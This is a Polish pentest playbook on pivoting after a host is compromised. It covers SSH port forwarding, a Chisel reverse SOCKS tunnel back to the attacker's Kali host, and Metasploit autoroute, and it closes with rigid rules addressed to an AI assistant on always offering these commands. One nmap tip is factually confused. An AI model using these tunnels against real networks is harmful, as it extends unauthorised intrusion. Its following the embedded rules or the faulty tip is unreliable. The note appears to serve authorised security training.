
# 05 Pivoting and Tunnels Playbook — Przekierowania i Ruch Boczny

Ta notatka steruje logiką ruchu bocznego (Lateral Movement), tworzenia tuneli oraz przekierowywania portów (Port Forwarding) po przejęciu początkowego hosta (Pivot).

---

## 🎯 Metodologia Tunelowania (Pivoting Flow)

1. INTERNAL RECON (Odkrycie nowych podsieci z przejętego hosta)
   ↓
2. SINGLE PORT FORWARDING (Dostęp do pojedynczej ukrytej usługi, np. bazy danych)
   ↓
3. DYNAMIC PORT FORWARDING (Tunelowanie całego ruchu przez proxychains)
   ↓
4. REVERSE TUNNELING (Ominięcie zapór sieciowych za pomocą Chisel/Metasploit)

---

## 🌲 Drzewo Decyzyjne Pivoting

### Krok 1: Przekierowanie przez SSH (Gdy mamy dane logowania SSH)
* **Pytanie:** Jak uzyskać dostęp do wew. usługi lub podsieci posiadając dane do SSH?
* **Wektory:**
  * **Lokalny Port Forwarding (1 usługa):** `ssh -L 8080:127.0.0.1:80 user@<PIVOT_IP>` (Udostępnia port 80 z Pivota na lokalnym 8080).
  * **Dynamiczny Port Forwarding (SOCKS4/5):** `ssh -D 9050 user@<PIVOT_IP>` (Wymaga użycia `proxychains` na maszynie atakującego).
* **Zobacz:** `[[SSH_Tunneling_CheatSheet]]`

### Krok 2: Przekierowanie bez SSH — Chisel (Reverse Proxy)
* **Pytanie:** Co jeśli mamy tylko zwykłego reverse shella (bez SSH) na maszynie z Windows/Linux, a chcemy proxy SOCKS?
* **Akcja:** Użyj narzędzia **Chisel** w trybie Reverse.
  * **Na Kali (Serwer):** `chisel server -p 8000 --reverse`
  * **Na Targecie (Klient):** `./chisel client <KALI_IP>:8000 R:socks`
* **Zasada:** Po nawiązaniu połączenia skonfiguruj `/etc/proxychains4.conf` na port 1080 i uruchamiaj narzędzia przez `proxychains`.
* **Zobacz:** `[[Chisel_Pivoting_Guide]]`

### Krok 3: Pivoting przez Metasploit (Meterpreter)
* **Pytanie:** Jak przekierować ruch, jeśli przejęliśmy hosta przez sesję Meterpreter?
* **Wektory:**
  * Automatyczny routing do nowej podsieci: `run autoroute -s 10.10.10.0/24`
  * Uruchomienie proxy dla zewnętrznych narzędzi: `use auxiliary/server/socks_proxy` (Ustaw SRVPORT na 9050).
* **Zobacz:** `[[Metasploit_Autoroute_Socks]]`

---

## ⚡ Twarde Wskazówki dla RAG / Asystenta AI
* Kiedy użytkownik pyta "jak dostać się do wewnętrznego IP", a posiada dane do SSH, ZAWSZE podawaj komendę `ssh -D` wraz z przypomnieniem o konfiguracji `proxychains`.
* Kiedy użytkownik ma zwykłą powłokę (nie SSH, nie Meterpreter), ZAWSZE sugeruj użycie narzędzia **Chisel** w trybie serwer-klient.
* Kiedy użytkownik używa Metasploita, nakazuj wykonanie `autoroute` przed próbą ataku na wewnętrzne maszyny.
* Nigdy nie proponuj używania nmapa z flagą `-sC` lub `-sV` przez proxychains (proxychains nie obsługuje dobrze skanów SYN/UDP). Zawsze polecaj pełne połączenie TCP (`nmap -sT`).
* * ZAKAZ proponowania `ping` lub `proxychains ping` do weryfikacji tunelu. Proxychains nie obsługuje ICMP. Weryfikację wykonuj ZAJEWSZE przez `proxychains nmap -sT -Pn -p 80,22 <IP>` lub `proxychains curl`.
* Edycja proxychains: Instruuj użytkownika, aby dopisał linię na końcu pliku (`>>` lub edycja w nano), a nie nadpisywał plik (`>`).
* * Wpis w `/etc/proxychains4.conf` dla tunelu Chisel/SSH musi ZAWSZE wskazywać na `127.0.0.1 1080` (nigdy na adres IP interfejsu <KALI_IP>).